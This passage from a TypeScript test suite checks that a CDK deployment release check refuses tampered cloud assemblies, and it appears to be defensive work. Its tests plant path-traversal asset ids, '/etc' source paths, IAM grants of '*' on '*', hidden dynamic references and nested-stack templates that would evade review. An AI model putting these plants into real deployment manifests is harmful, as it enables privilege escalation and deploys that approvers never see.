    const template = named(folder, part, '.template.json')
    const file = template.slice(folder.length + 1)
    const key = keyOf(template)
    edit(named(folder, part, '.assets.json'), json => {
      const assets = json.files as Record<string, Entry>
      for (const [id, entry] of Object.entries(assets))
        if (entry.source.path === file) {
          for (const destination of Object.values(entry.destinations)) destination.objectKey = key
          delete assets[id]
          assets[key.slice(0, 64)] = entry
        }
    })
    edit(join(folder, 'manifest.json'), json => {
      for (const artifact of Object.values(artifacts(json)))
        if (artifact.properties?.templateFile === file)
          artifact.properties.stackTemplateAssetObjectUrl = `s3://${BUCKET}/${key}`
    })
  }

  it('passes the real layout: a root manifest, three nested assemblies and the root asset folder', () => {
    expect(readdirSync(source)).toEqual(
      expect.arrayContaining(['manifest.json', 'assembly-nonprod', 'assembly-prod', 'assembly-restore']),
    )
    expect(readdirSync(source).some(name => name.startsWith('asset.'))).toBe(true)
    expect(check(() => {})).toBe('passed')
    expect(counted()).toBe('passed')
  }, 30_000)

  // Round 12's second iteration: a jq -e handed several files reads the last file alone, as a stream, and the
  // stand-in above read -e in the first word alone, so the container image check moved to one jq -r -e over
  // every asset manifest passed a plant in the first of them and was never counted. It is counted now, in any
  // flag word before the program (and DPW-10 refuses it: JQ_PIPED_RULE).
  it('counts a jq -e handed -e in any flag word, and several files as several values (round 12)', () => {
    const container =
      "      jq -e '(.dockerImages // {}) | length == 0' \"$dir/$file\" >/dev/null 2>&1 || asset_refuse 'an asset manifest holds a container image asset'\n"
    const slurped = "    jq -se '.[0] as $m"
    expect(ASSET_CHECK).toContain(container)
    expect(ASSET_CHECK).toContain(slurped)
    for (const flags of ['-r -e', '-e -r', '--arg x y -e', '-e']) {
      const variant = ASSET_CHECK.replace(container, '').replace(
        slurped,
        `    if [ "\${#stackfiles[@]}" -gt 0 ] && ! jq ${flags} '(.dockerImages // {}) | length == 0' "\${stackfiles[@]}" >/dev/null 2>&1; then asset_refuse 'an asset manifest holds a container image asset'; fi\n${slurped}`,
      )
      expect(variant).not.toBe(ASSET_CHECK)
      const said = counted(source, variant).split('\n')
      expect(said[0], flags).toBe('passed')
      expect(said.length, flags).toBeGreaterThan(1)
      expect(said[1], flags).toContain('(.dockerImages // {}) | length == 0')
      expect(canonicalTextFindings({ ASSET_CHECK: variant }).join('\n'), flags).toContain(
        'hands jq -e no stream of values: it reads one file or a here-string on its own command, unless it is given -n or -s',
      )
    }
  }, 120_000)

  // The synth checks two builds beside the committed one: a restore up's (restoreActive, the restore stage's
  // Valkey, endpoints and services) and a drill-break's (the non-prod stage alone, realtime broken). Each passes
  // as the committed build does, so a resource type, intrinsic function or role key that only one of them
  // writes fails here, on the PR that adds it, and not at the first restore up or drill-break (review 9
  // ROLLBACK-04, GUARDS-01). Each is synthesised afresh and removed after.
  it.each([
    [
      "a restore up's build (restoreActive)",
      { restoreActive: true },
      ['assembly-nonprod', 'assembly-prod', 'assembly-restore'],
    ],
    ["a drill-break's build (drill)", { drill: true }, ['assembly-nonprod']],
  ] as const)(
    'passes %s',
    (_, run, nested) => {
      const built = synthWorkload({ run, cliMetadata: true }).synthesised.outdir
      made.push(built)
      expect(
        readdirSync(built)
          .filter(name => name.startsWith('assembly-'))
          .sort(),
      ).toEqual(nested)
      expect(check(() => {}, RELEASE, built)).toBe('passed')
      expect(counted(built)).toBe('passed')
    },
    120_000,
  )

  // FLOW-A3-01 (round 6). A file asset's id, its key in the manifest's files, is a path to the CLI: it writes
  // the zip it packages to .cache/<id>.zip beside the manifest, or uploads the file already there, so an id
  // with a / or .. had it write into its own folder or the runner's home and upload a .zip from outside the
  // assembly. Each id is now its key's 64 hex digits, as the synth writes it.
  it('refuses a file asset whose id isn’t its key’s 64 hex digits (FLOW-A3-01, round 6)', () => {
    // Adds the Platform manifest's zip asset again under id, at a fresh key of letter.
    const another = (id: string, letter: string) => (dir: string) =>
      edit(named(nonprod(dir), 'Platform', '.assets.json'), json => {
        const assets = json.files as Record<string, Entry>
        const zip = Object.values(assets).find(entry => entry.source.packaging === 'zip')
        if (zip === undefined) throw new Error('no zip asset in Platform')
        const copy = structuredClone(zip)
        for (const destination of Object.values(copy.destinations)) destination.objectKey = `${letter.repeat(64)}.zip`
        assets[id] = copy
      })
    // The synth writes every id as its key's digits.
    const ids = (dir: string) =>
      readdirSync(dir, { recursive: true, encoding: 'utf8' })
        .filter(path => path.endsWith('.assets.json'))
        .flatMap(path =>
          Object.entries((read(join(dir, path)).files ?? {}) as Record<string, Entry>).map(([id, entry]) =>
            Object.values(entry.destinations).every(destination => destination.objectKey === `${id}.json`)
              ? 'json'
              : Object.values(entry.destinations).every(destination => destination.objectKey === `${id}.zip`)
                ? 'zip'
                : id,
          ),
        )
    expect(new Set(ids(source))).toEqual(new Set(['json', 'zip']))
    expect(check(another('a'.repeat(64), 'a'))).toBe('passed')
    for (const id of [
      '../../../aws-cdk/package/lib/written-by-the-assembly',
      '../../../../../written-in-home',
      '../../../outside',
      'x/y',
      '..',
      'b'.repeat(64),
      'A'.repeat(64),
      `${'a'.repeat(64)}/`,
    ]) {
      expect(check(another(id, 'a'))).toBe(ID)
    }
    // An id that is another asset's key, or the key's digits with its extension, is refused too.
    expect(check(another('a'.repeat(64), 'c'))).toBe(ID)
    expect(check(another(`${'a'.repeat(64)}.zip`, 'a'))).toBe(ID)
    // Eleven runs of ASSET_CHECK, each over its own copy of the assembly, take as long as the machine's
    // load makes them, as its siblings' do.
  }, 120_000)

  it('refuses each planted breakage of the assets, with one line naming its rule', () => {
    const executable = (path: string) =>
      edit(path, json =>
        setSources(json, source => {
          source.executable = ['true']
        }),
      )
    expect(check(dir => executable(named(nonprod(dir), 'Data', '.assets.json')))).toBe(RUNS)
    expect(
      check(dir =>
        edit(
          named(prod(dir), 'Data', '.assets.json'),
          json => (json.dockerImages = { a: { source: { directory: '.' } } }),
        ),
      ),
    ).toBe(refused('an asset manifest holds a container image asset'))
    expect(
      check(dir => {
        const assets = named(nonprod(dir), 'Data', '.assets.json')
        const json = read(assets)
        setSources(json, source => {
          source.executable = ['true']
        })
        write(join(nonprod(dir), 'x.json'), json)
        edit(join(nonprod(dir), 'manifest.json'), manifest => {
          for (const artifact of Object.values(artifacts(manifest))) {
            if (artifact.properties?.file === assets.slice(nonprod(dir).length + 1)) artifact.properties.file = 'x.json'
          }
        })
      }),
    ).toBe(RUNS)
    expect(
      check(dir =>
        edit(named(nonprod(dir), 'Platform', '.assets.json'), json =>
          setSources(json, source => {
            source.packaging = 'container-image'
          }),
        ),
      ),
    ).toBe(RUNS)
    expect(
      check(dir =>
        edit(named(nonprod(dir), 'Platform', '.assets.json'), json =>
          setSources(json, source => {
            source.path = '/etc/hostname'
          }),
        ),
      ),
    ).toBe(RUNS)
    expect(
      check(dir =>
        edit(named(nonprod(dir), 'Platform', '.assets.json'), json =>
          setSources(json, source => {
            source.path = '../../../etc'
          }),
        ),
      ),
    ).toBe(refused('an asset path leaves the assembly'))
    // jq -e reads its program's last value alone, so each rule over every entry is planted in an entry that
    // isn't its list's last: Platform's first file asset (its zip, before its template) alone.
    const first = (change: (source: Record<string, unknown>) => void) => (dir: string) =>
      edit(named(nonprod(dir), 'Platform', '.assets.json'), json => {
        const all = files(json)
        expect(all.length).toBeGreaterThan(1)
        if (all[0] !== undefined) change(all[0].source)
      })
    for (const change of [
      (source: Record<string, unknown>) => {
        source.executable = ['bash', '-c', 'true']
        delete source.path
      },
      (source: Record<string, unknown>) => {
        source.packaging = 'container-image'
      },
      (source: Record<string, unknown>) => {
        source.path = '/etc/hostname'
      },
    ]) {
      expect(check(first(change)), String(change)).toBe(RUNS)
    }
    // No asset manifest at all: with the stacks they upload gone too, and with the stacks left, whose templates
    // then nothing uploads.
    const without =
      (...types: string[]) =>
      (dir: string) => {
        for (const folder of [dir, nonprod(dir), prod(dir), join(dir, 'assembly-restore')]) {
          edit(join(folder, 'manifest.json'), json => {
            json.artifacts = Object.fromEntries(
              Object.entries(artifacts(json)).filter(([, artifact]) => !types.includes(artifact.type ?? '')),
            )
          })
        }
      }
    expect(check(without('cdk:asset-manifest', 'aws:cloudformation:stack'))).toBe(refused('no asset manifest was read'))
    expect(check(without('cdk:asset-manifest'))).toBe(TEMPLATE)
  }, 30_000)

  // FLOW-A1-01 and A1-02: the CLI hands CloudFormation the object a stack's stackTemplateAssetObjectUrl names,
  // which its asset manifests upload, never the templateFile the release check reads and the approver's diff
  // shows; and it names a stack with no stackName by its artifact's id, and reads a file name raw, where the
  // release check read both through @tsv. So each stack's template object is uploaded from its own
  // templateFile alone, its name is Hearth- and its stage's id, and a file name is letters, digits, dots,
  // dashes and underscores.
  it('refuses a template CloudFormation would be handed other than the one checked, and a stack named otherwise (FLOW-A1-01, A1-02)', () => {
    const stacks = (dir: string, change: (artifact: Artifact & { displayName?: string }) => void) =>
      edit(join(dir, 'manifest.json'), json => {
        for (const artifact of Object.values(artifacts(json)))
          if (
            artifact.type === 'aws:cloudformation:stack' &&
            artifact.properties?.stackName === 'Hearth-nonprod-Services'
          )
            change(artifact)
      })
    const template = (dir: string) => named(nonprod(dir), 'Services', '.template.json')
    const assets = (dir: string) => named(nonprod(dir), 'Services', '.assets.json')
    // Plant D: the template asset uploads another plain file in the same folder.
    expect(
      check(dir => {
        cpSync(template(dir), join(nonprod(dir), 'deployed.json'))
        edit(assets(dir), json => {
          for (const entry of entries(json)) if (entry.source.packaging === 'file') entry.source.path = 'deployed.json'
        })
      }),
    ).toBe(TEMPLATE)
    // A second asset on the template's key, from another file (whose bytes aren't the key's), and from a copy
    // of the template (whose are, but which isn't the stack's templateFile). In the template's own manifest it
    // needs an id other than the key's digits, which the id rule refuses; in another of the stage's manifests,
    // under the key's digits as the synth would write it, the key and the template rules do.
    const second = (path: string, manifest: (dir: string) => string) => (dir: string) => {
      const [first] = entries(read(assets(dir)))
      const [destination] = Object.values(first?.destinations ?? {})
      edit(manifest(dir), json => {
        const id = manifest(dir) === assets(dir) ? 'second' : String(destination?.objectKey).slice(0, 64)
        ;(json.files as Record<string, unknown>)[id] = { ...first, source: { path, packaging: 'file' } }
      })
    }
    const tasks = (dir: string) => named(nonprod(dir), 'Tasks', '.assets.json')
    expect(check(second('tree.json', assets))).toBe(ID)
    expect(check(second('tree.json', tasks))).toBe(KEY)
    for (const [manifest, refusal] of [
      [assets, ID],
      [tasks, TEMPLATE],
    ] as const) {
      expect(
        check(dir => {
          cpSync(template(dir), join(nonprod(dir), 'copy.json'))
          second('copy.json', manifest)(dir)
        }),
      ).toBe(refusal)
    }
    // The template uploaded as a zip (a .json key no zip has), a URL naming no asset's key and one that isn't
    // s3; and no URL at all, which is no longer the synth's set of properties.
    expect(
      check(dir =>
        edit(assets(dir), json => {
          for (const entry of entries(json)) entry.source.packaging = 'zip'
        }),
      ),
    ).toBe(DESTINATION)
    for (const [url, rule] of [
      [`s3://${BUCKET}/other.json`, TEMPLATE],
      ['https://example.invalid/t.json', TEMPLATE],
      [undefined, FACTS],
    ] as const) {
      expect(
        check(dir =>
          stacks(nonprod(dir), artifact => {
            if (artifact.properties !== undefined) artifact.properties.stackTemplateAssetObjectUrl = url
          }),
        ),
        String(url),
      ).toBe(rule)
    }
    // Plant A: no stackName, which the CLI would take from the artifact's id (no longer the synth's set of
    // properties); a name that isn't the stage's id; and no displayName.
    for (const [change, rule] of [
      [
        (artifact: Artifact & { displayName?: string }) => {
          if (artifact.properties !== undefined) delete artifact.properties.stackName
        },
        FACTS,
      ],
      [
        (artifact: Artifact & { displayName?: string }) => {
          if (artifact.properties !== undefined) artifact.properties.stackName = 'Hearth-nonprod-Tasks'
        },
        TEMPLATE,
      ],
      [
        (artifact: Artifact & { displayName?: string }) => {
          delete artifact.displayName
        },
        TEMPLATE,
      ],
    ] as const) {
      expect(check(dir => stacks(nonprod(dir), change))).toBe(rule)
    }
    // Plant B: a backslash in a file name, which @tsv would double; and a space.
    for (const name of ['S\\x.template.json', 'S x.template.json']) {
      expect(
        check(dir =>
          stacks(nonprod(dir), artifact => {
            if (artifact.properties !== undefined) artifact.properties.templateFile = name
          }),
        ),
        name,
      ).toBe(PLAIN)
    }
  }, 60_000)

  // Round 5's fourth attack (FLOW-A4-01). A template can hand CloudFormation another template by reference:
  // a nested stack's TemplateURL names an object the asset manifests upload, while the CLI's diff reads the
  // file its aws:asset:path names (any file ../ reaches) and the release check reads neither. A stack set, a
  // Service Catalog product, a transform (a macro, SAM, AWS::Include) and a module do the same, and a
  // registered type runs a handler no template shows. So a template holds CloudFormation's own sections
  // alone, no Transform or Fn::Transform, and resource types of AWS's own (the VPC's default-group custom
  // resource aside) outside CloudFormation's, SAM's and Service Catalog's, in any letter case.
  it('refuses a template that hands CloudFormation a template or a handler the diff and release check never read (FLOW-A4-01)', () => {
    const HANDS = refused(
      'a template holds a section, a transform or a resource type a workload synth never writes, which hands CloudFormation a template, a handler or a grant that neither the diff nor the release check shows',
    )
    const planted = (change: (template: Record<string, unknown>) => void) => (dir: string) => {
      edit(named(nonprod(dir), 'Services', '.template.json'), change)
      rekey(nonprod(dir), 'Services')
    }
    const resource = (value: unknown) =>
      planted(template => {
        const resources = template.Resources as Record<string, unknown>
        resources.Extra = value
      })
    const nested = (path: string) => ({
      Type: 'AWS::CloudFormation::Stack',
      Properties: { TemplateURL: `https://s3.ap-southeast-1.amazonaws.com/${BUCKET}/${'a'.repeat(64)}.json` },
      Metadata: { 'aws:asset:path': path },
    })
    // The layout re-keyed alone passes, and so does another resource of a type the synth writes, with the keys and
    // name the synth writes for it, so each refusal below is its plant's.
    expect(check(planted(() => {}))).toBe('passed')
    expect(
      check(
        resource({
          Type: 'AWS::SSM::Parameter',
          Properties: { Name: '/hearth/nonprod/valkey/endpoint', Type: 'String', Value: 'x' },
          Metadata: { 'aws:cdk:path': 'nonprod/Services/Extra' },
        }),
      ),
    ).toBe('passed')
    for (const [plant, label] of [
      [
        resource(nested('nonprodServicesExtra.nested.template.json')),
        'a nested stack whose metadata names another file',
      ],
      [resource(nested('../../outside.json')), 'a nested stack whose metadata names a file outside the assembly'],
      [resource({ Type: 'AWS::Cloudformation::Stack', Properties: {} }), 'a nested stack in another letter case'],
      [resource({ Type: 'AWS::CloudFormation::StackSet', Properties: {} }), 'a stack set'],
      [resource({ Type: 'AWS::CloudFormation::Macro', Properties: {} }), 'a macro'],
      [resource({ Type: 'AWS::CloudFormation::CustomResource', Properties: {} }), 'a custom resource'],
      [resource({ Type: 'Custom::Other', Properties: {} }), 'another custom resource'],
      [resource({ Type: 'AWS::Serverless::Application', Properties: {} }), 'a SAM application'],
      [resource({ Type: 'AWS::ServiceCatalog::CloudFormationProvisionedProduct', Properties: {} }), 'a product'],
      [resource({ Type: 'Hearth::Plant::Thing::MODULE', Properties: {} }), 'a module'],
      [resource({ Type: 'Hearth::Plant::Thing', Properties: {} }), 'a registered type'],
      [resource({ Properties: {} }), 'a resource with no type'],
      [resource('x'), 'a resource that is not an object'],
      [
        planted(template => {
          template.Transform = 'AWS::Serverless-2016-10-31'
        }),
        'a top-level Transform',
      ],
      [
        resource({
          Type: 'AWS::SSM::Parameter',
          Properties: {
            Type: 'String',
            Value: { 'Fn::Transform': { Name: 'AWS::Include', Parameters: { Location: 'x' } } },
          },
        }),
        'an Fn::Transform',
      ],
      [
        planted(template => {
          template.Hooks = { Hook: { Type: 'AWS::CodeDeploy::BlueGreen' } }
        }),
        'a Hooks section',
      ],
      [
        planted(template => {
          template.Resources = []
        }),
        'Resources that are not an object',
      ],
    ] as const) {
      expect(check(plant), label).toBe(HANDS)
    }
  }, 120_000)

  // The eighth review's third attack (INPUTS-A3-01). Every workload parameter is an SSM parameter type, whose
  // Default names a parameter-store entry: CloudFormation deploys the value the entry holds when the stack
  // deploys, which a stack deployed earlier in the run can write, and the diff shows an added
  // AWS::SSM::Parameter as one line with no name or value. A release wrote a new entry from Platform, read it in
  // Services and granted * on * on a condition over it, while the approver read the Default as the value. So a
  // template holds no Conditions or Mappings, every parameter is SSM-typed and names one of the workload's own
  // entries, and no brace but {} and Fn::Sub's ${name} stands in a string, so none joins into a dynamic
  // reference, {{resolve:…}}, which CloudFormation resolves from the store the same way.
  it('refuses a template that takes a value at deploy time the diff doesn’t show (INPUTS-A3-01)', () => {
    const HANDS = refused(
      'a template holds a section, a transform or a resource type a workload synth never writes, which hands CloudFormation a template, a handler or a grant that neither the diff nor the release check shows',
    )
    const TAKES = refused(
      "a template takes a value at deploy time that the diff doesn't show: a parameter but an SSM-typed one naming one of the workload's own entries, or a brace a string could join into a dynamic reference",
    )
    const planted = (change: (template: Record<string, unknown>) => void) => (dir: string) => {
      edit(named(nonprod(dir), 'Services', '.template.json'), change)
      rekey(nonprod(dir), 'Services')
    }
    const parameters = (template: Record<string, unknown>) => template.Parameters as Record<string, unknown>
    const resources = (template: Record<string, unknown>) => template.Resources as Record<string, unknown>
    const ssm = (name: string) => ({ Type: 'AWS::SSM::Parameter::Value<String>', Default: name })
    // A resource of a type the synth writes, whose one property holds the value a case plants.
    const policy = (name: unknown) => ({ Type: 'AWS::SSM::Parameter', Properties: { Name: name } })
    // The re-keyed layout and another of the stage's own entries pass (under an id of CDK's own shape, which the
    // label rule holds a parameter to: round 12's third iteration, its second pass), and a Sub over a
    // pseudo-parameter and an attribute and an empty {} get past this rule, refused only by the outputs' own hold
    // (an output the synth never writes, round 10's first attack), so each refusal below is its plant's. (Another
    // stage's entry passed here before; the round-10 holds refuse it.)
    const outputs = (template: Record<string, unknown>) => template.Outputs as Record<string, unknown>
    expect(check(planted(() => {}))).toBe('passed')
    expect(
      check(
        planted(template => {
          parameters(template).SsmParameterValuehearthnonprodsecuritygroupworker0A1B2C3DParameter = ssm(
            '/hearth/nonprod/security-group/worker',
          )
        }),
      ),
    ).toBe('passed')
    expect(
      check(
        planted(template => {
          outputs(template).Extra = { Value: { 'Fn::Sub': [`a-\${AWS::AccountId}-\${Res.Arn}`, {}] } }
          outputs(template).Other = { Value: 'x{}y' }
        }),
      ),
    ).toBe(
      refused(
        "a stack's outputs aren't the workload's: an output the workload synth never writes for its stack, or a value of another shape, which the one-offs, the release checks and the read-back would read",
      ),
    )
    // The attack's own plant: a condition over a new entry, granting * on * while it reads open.
    expect(
      check(
        planted(template => {
          parameters(template).Exports = ssm('/hearth/nonprod/exports/access')
          template.Conditions = { ExportsOpen: { 'Fn::Equals': [{ Ref: 'Exports' }, 'open'] } }
          resources(template).ExportsRead = {
            Type: 'AWS::IAM::Policy',
            Properties: {
              PolicyName: 'exports-read',
              Roles: ['hearth-nonprod-api-task'],
              PolicyDocument: {
                Version: '2012-10-17',
                Statement: [
                  {
                    Effect: 'Allow',
                    Action: { 'Fn::If': ['ExportsOpen', '*', 's3:GetObject'] },
                    Resource: { 'Fn::If': ['ExportsOpen', '*', 'x'] },
                  },
                ],
              },
            },
          }
        }),
      ),
    ).toBe(HANDS)
    for (const [section, label] of [
      ['Conditions', 'a Conditions section'],
      ['Mappings', 'a Mappings section'],
    ] as const) {
      expect(
        check(
          planted(template => {
            template[section] = { X: { 'Fn::Equals': ['a', 'a'] } }
          }),
        ),
        label,
      ).toBe(HANDS)
    }
    for (const [change, label] of [
      [
        (template: Record<string, unknown>) => (parameters(template).X = ssm('/hearth/nonprod/exports/access')),
        'a new entry',
      ],
      [
        (template: Record<string, unknown>) => (parameters(template).X = ssm('/hearth/nonprod/security-group/bastion')),
        'an entry the stacks only write',
      ],
      [
        (template: Record<string, unknown>) => (parameters(template).X = { Type: 'String', Default: 'open' }),
        'a plain parameter',
      ],
      [
        (template: Record<string, unknown>) =>
          (parameters(template).X = { ...ssm('/hearth/organisation/id'), AllowedValues: ['x'] }),
        'another key',
      ],
      [(template: Record<string, unknown>) => (template.Parameters = []), 'parameters that are not an object'],
      [
        (template: Record<string, unknown>) => (resources(template).X = policy('{{resolve:ssm:/x}}')),
        'a dynamic reference',
      ],
      [
        (template: Record<string, unknown>) =>
          (resources(template).X = policy({ 'Fn::Join': ['', ['{', '{resolve:ssm:/x}', '}']] })),
        'one joined from braces',
      ],
      [
        (template: Record<string, unknown>) =>
          (resources(template).X = policy({ 'Fn::Join': ['{', ['', '', 'resolve:ssm:/x}}']] })),
        'one joined by a brace',
      ],
      [
        (template: Record<string, unknown>) => (resources(template).X = policy({ 'Fn::Sub': `{\${AWS::Region}}` })),
        'a Sub with a brace round a name',
      ],
      [
        (template: Record<string, unknown>) => (resources(template).X = policy({ 'Fn::Sub': `\${!x}` })),
        "a Sub's escaped name",
      ],
      [
        (template: Record<string, unknown>) => (resources(template).X = policy(`\${AWS::Region}`)),
        `a \${name} outside a Sub`,
      ],
      [
        (template: Record<string, unknown>) =>
          (resources(template).X = { Type: 'AWS::SSM::Parameter', Properties: { '{': 'x' } }),
        'a brace in a key',
      ],
    ] as const) {
      expect(check(planted(change)), label).toBe(TAKES)
    }
  }, 120_000)

  // The eighth review's fourth attack (INPUTS-A4-01). The approver's diff prints an added resource as one line
  // with no properties, and its IAM table reads a policy resource's statements only under the principals its
  // Groups, Users and Roles name, so an AWS::IAM::RolePolicy granting * on * through its RoleName (prod's own
  // api task role, rendered into the restore stage too) showed no grant and no role anywhere, and the asset
  // check admitted any type of AWS's own. A template now holds only the types the workload's stacks write.
  it('holds every template to the resource types the workload’s stacks write (INPUTS-A4-01)', () => {
    const HANDS = refused(
      'a template holds a section, a transform or a resource type a workload synth never writes, which hands CloudFormation a template, a handler or a grant that neither the diff nor the release check shows',
    )
    const restore = (dir: string) => join(dir, 'assembly-restore')
    const added = (stage: (dir: string) => string, value: unknown) => (dir: string) => {
      edit(named(stage(dir), 'Services', '.template.json'), template => {
        ;(template.Resources as Record<string, unknown>).ApiTaskLogsRead = value
      })
      rekey(stage(dir), 'Services')
    }
    const all = { Version: '2012-10-17', Statement: [{ Effect: 'Allow', Action: '*', Resource: '*' }] }
    // Another resource of a type the stacks write, with its stage's name, passes, so each refusal below is its
    // type's.
    expect(
      check(
        added(prod, {
          Type: 'AWS::Logs::LogGroup',
          Properties: { LogGroupName: '/hearth/prod/extra', RetentionInDays: 30 },
          Metadata: { 'aws:cdk:path': 'prod/Services/ApiTaskLogsRead' },
        }),
      ),
    ).toBe('passed')
    for (const [stage, value, label] of [
      [
        prod,
        {
          Type: 'AWS::IAM::RolePolicy',
          Properties: { RoleName: 'hearth-prod-api-task', PolicyName: 'logs-read', PolicyDocument: all },
        },
        "a role policy on prod's api task role",
      ],
      [
        restore,
        {
          Type: 'AWS::IAM::RolePolicy',
          Properties: { RoleName: 'hearth-prod-api-task', PolicyName: 'logs-read', PolicyDocument: all },
        },
        "the same, rendered into the restore stage on prod's role",
      ],
      [
        nonprod,
        { Type: 'AWS::IAM::UserPolicy', Properties: { UserName: 'x', PolicyName: 'x', PolicyDocument: all } },
        'a user policy',
      ],
      [
        nonprod,
        { Type: 'AWS::IAM::GroupPolicy', Properties: { GroupName: 'x', PolicyName: 'x', PolicyDocument: all } },
        'a group policy',
      ],
      [
        prod,
        {
          Type: 'AWS::IAM::Policy',
          Properties: { PolicyName: 'x', Roles: ['hearth-prod-api-task'], PolicyDocument: all },
        },
        'a policy',
      ],
      [prod, { Type: 'AWS::IAM::ManagedPolicy', Properties: { PolicyDocument: all } }, 'a managed policy'],
      [prod, { Type: 'AWS::IAM::User', Properties: {} }, 'a user'],
      [prod, { Type: 'AWS::IAM::Group', Properties: {} }, 'a group'],
      [prod, { Type: 'AWS::IAM::AccessKey', Properties: { UserName: 'x' } }, 'an access key'],
      [prod, { Type: 'AWS::S3::BucketPolicy', Properties: { Bucket: 'x', PolicyDocument: all } }, 'a bucket policy'],
      [prod, { Type: 'AWS::Lambda::Permission', Properties: {} }, "a function's permission"],
      [prod, { Type: 'AWS::IAM::Role ', Properties: {} }, 'a type the stacks write, with a blank after it'],
      [prod, { Type: 'aws::iam::role', Properties: {} }, 'a type the stacks write, in another letter case'],
    ] as const) {
      expect(check(added(stage, value)), label).toBe(HANDS)
    }
  }, 120_000)

  // Round 5's second attack (COMMANDS-A2-01). The CLI publishes every asset of every stack it deploys,
  // resolves a destination's placeholders before it publishes, and uploads nothing to a key that already
  // holds an object; CloudFormation is handed the object at the template's key. So another stack's asset
  // that put another template at the Services template's key under another spelling of the bucket (P, and S
  // with the release and images kept), or an earlier run's asset at a key no stack named yet, which a later
  // run's template URL then names (Q1 then Q2), would be what CloudFormation deploys, while the approver's
  // diff and the release check read the templateFile. Every file asset therefore has one destination, the
  // staging bucket, its region and its publishing role as the synth spells them, at a key that is the
  // sha256 of its bytes (a file's) or 64 hex digits (a zip's), so the object at a template's key is that
  // template whoever put it there.
  it('holds every file asset to the staging bucket by one spelling, at a key of its own bytes (COMMANDS-A2-01)', () => {
    const OTHER = `${'1'.repeat(40)}:sha256:${'2'.repeat(64)}`
    // Another Services template in the stage's folder: another release and another image (P, Q), or the
    // release and images kept and one environment variable added to each container (S).
    const deployed = (folder: string, stealthy = false) => {
      const json = read(named(folder, 'Services', '.template.json'))
      const outputs = json.Outputs as Record<string, { Value: unknown }>
      if (!stealthy && outputs.Release !== undefined) outputs.Release.Value = OTHER
      for (const resource of Object.values(json.Resources as Record<string, Record<string, unknown>>)) {
        if (resource.Type !== 'AWS::ECS::TaskDefinition') continue
        const properties = resource.Properties as { ContainerDefinitions: Array<Record<string, unknown>> }
        for (const container of properties.ContainerDefinitions) {
          if (stealthy)
            container.Environment = [...((container.Environment as unknown[]) ?? []), { Name: 'X', Value: 'x' }]
          else container.Image = 'example.invalid/not-the-release:latest'
        }
      }
      write(join(folder, 'deployed.json'), json)
      return 'deployed.json'
    }
    // The Services template asset's own destination, and an asset added to one stack's asset manifest.
    const servicesDestination = (folder: string) => {
      const [entry] = entries(read(named(folder, 'Services', '.assets.json')))
      const [destination] = Object.values(entry?.destinations ?? {})
      return { ...destination }
    }
    const addAsset = (folder: string, part: string, path: string, destination: Record<string, unknown>) =>
      edit(named(folder, part, '.assets.json'), json => {
        ;(json.files as Record<string, unknown>)[String(destination.objectKey).slice(0, 64)] = {
          displayName: 'an asset of its own',
          source: { path, packaging: 'file' },
          destinations: { 'current_account-ap-southeast-1-00000000': destination },
        }
      })
    const REGION_BUCKET = `cdk-hearthapp-assets-\${AWS::AccountId}-\${AWS::Region}`
    // P and S: the Tasks asset manifest uploads another template to the Services template's bucket and key,
    // the bucket spelled with the region's placeholder, in both stages; and the same spelled as the synth
    // spells it, whose bytes then aren't the key's.
    const onTasks =
      (bucketName: string, stealthy = false) =>
      (dir: string) => {
        for (const folder of [nonprod(dir), prod(dir)])
          addAsset(folder, 'Tasks', deployed(folder, stealthy), { ...servicesDestination(folder), bucketName })
      }
    expect(check(onTasks(REGION_BUCKET))).toBe(DESTINATION)
    expect(check(onTasks(REGION_BUCKET, true))).toBe(DESTINATION)
    expect(check(onTasks(BUCKET))).toBe(KEY)
    expect(check(onTasks(BUCKET, true))).toBe(KEY)
    // Q1 then Q2: an asset uploads another template to a key no stack names; then the Services template URL
    // and its own asset name that key, the asset uploading the honest templateFile.
    const Q = `${'a'.repeat(64)}.json`
    expect(
      check(dir =>
        addAsset(nonprod(dir), 'Services', deployed(nonprod(dir)), {
          ...servicesDestination(nonprod(dir)),
          objectKey: Q,
        }),
      ),
    ).toBe(KEY)
    expect(
      check(dir => {
        edit(named(nonprod(dir), 'Services', '.assets.json'), json => {
          const assets = json.files as Record<string, Entry>
          for (const [id, entry] of Object.entries(assets)) {
            for (const destination of Object.values(entry.destinations)) destination.objectKey = Q
            delete assets[id]
            assets[Q.slice(0, 64)] = entry
          }
        })
        edit(join(nonprod(dir), 'manifest.json'), json => {
          for (const artifact of Object.values(artifacts(json)))
            if (artifact.properties?.stackName === 'Hearth-nonprod-Services')
              artifact.properties.stackTemplateAssetObjectUrl = `s3://${BUCKET}/${Q}`
        })
      }),
    ).toBe(KEY)
    // R: the template URL and its asset name a bucket outside the bootstrap.
    expect(
      check(dir => {
        const other = 'another-bucket-example'
        edit(named(nonprod(dir), 'Services', '.assets.json'), json => {
          for (const entry of entries(json))
            for (const destination of Object.values(entry.destinations)) destination.bucketName = other
        })
        edit(join(nonprod(dir), 'manifest.json'), json => {
          for (const artifact of Object.values(artifacts(json)))
            if (artifact.properties?.stackName === 'Hearth-nonprod-Services') {
              const url = String(artifact.properties.stackTemplateAssetObjectUrl)
              artifact.properties.stackTemplateAssetObjectUrl = url.replace(BUCKET, other)
            }
        })
      }),
    ).toBe(DESTINATION)
    // Each destination field off the synth's: another region, another role, a field of its own, a second
    // destination, a key in a folder, upper-case hex, a file at a .zip key, and a file outside its folder.
    const destinations = (change: (entry: Entry) => void) => (dir: string) =>
      edit(named(prod(dir), 'Data', '.assets.json'), json => {
        for (const entry of entries(json)) change(entry)
      })
    const each = (change: (destination: Record<string, unknown>) => void) =>
      destinations(entry => {
        for (const destination of Object.values(entry.destinations)) change(destination)
      })
    for (const plant of [
      each(destination => (destination.region = 'us-east-1')),
      each(
        destination =>
          (destination.assumeRoleArn = String(destination.assumeRoleArn).replace('file-publishing', 'deploy')),
      ),
      each(destination => (destination.assumeRoleExternalId = 'x')),
      each(destination => (destination.objectKey = `x/${String(destination.objectKey)}`)),
      each(
        destination => (destination.objectKey = String(destination.objectKey).toUpperCase().replace('.JSON', '.json')),
      ),
      each(destination => (destination.objectKey = String(destination.objectKey).replace('.json', '.zip'))),
      destinations(entry => {
        const [first] = Object.values(entry.destinations)
        entry.destinations.second = { ...first }
      }),
      destinations(entry => (entry.source.path = `../assembly-prod/${String(entry.source.path)}`)),
    ]) {
      expect(check(plant)).toBe(DESTINATION)
    }
  }, 120_000)

  // Round 5's second attack (COMMANDS-A2-02). The CLI acts on each stack's deploy facts, which no template
  // or diff shows: it sets termination protection to the artifact's (off when it is missing), reads the
